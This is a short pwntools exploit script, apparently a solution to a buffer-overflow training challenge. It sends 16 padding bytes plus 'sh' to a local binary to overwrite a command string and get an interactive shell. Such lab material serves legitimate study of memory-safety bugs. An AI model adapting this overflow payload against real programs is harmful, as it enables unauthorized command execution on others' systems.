from pwn import*

p = process('./Bufferoverflow-overwrite-short-command')

payload = b"a"*16 + b"sh"

p.sendline(payload)
p.interactive()
